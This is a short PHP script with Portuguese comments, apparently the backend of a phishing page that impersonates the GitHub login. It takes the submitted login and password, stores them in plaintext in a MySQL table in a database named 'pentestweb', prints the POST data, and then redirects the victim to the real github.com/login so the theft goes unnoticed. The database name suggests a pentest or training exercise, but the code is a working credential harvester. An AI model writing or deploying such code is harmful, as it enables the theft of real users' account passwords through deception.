<?php

// Alterei o nome dos inputs de email para login e de pass para password
// Alterei o Location para redirecion para github.com/login
var_dump(value: $_SERVER["REQUEST_METHOD"]);
print_r(value: $_POST);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if ($_POST["login"] != "" AND $_POST["password"] != "") {


        $conn = new PDO(dsn: "mysql:host=localhost;dbname=pentestweb", username: 'root', password: '');

        $conn->setAttribute(attribute: PDO::ATTR_ERRMODE, value: PDO::ERRMODE_EXCEPTION);
        echo "Connected sucessfully";
        $stmt = $conn->prepare(query: ' INSERT INTO tb_usuario(LOGIN_US,SENHA_US) VALUES(? , ?) ');
        $stmt->execute(params: array ($_POST["login"], $_POST["password"]));
        // echo "feito";
        header(header: "Location:https://github.com/login");
    }else{
        header(header: "Location:/");
    }

}else{
    die("");
}

?>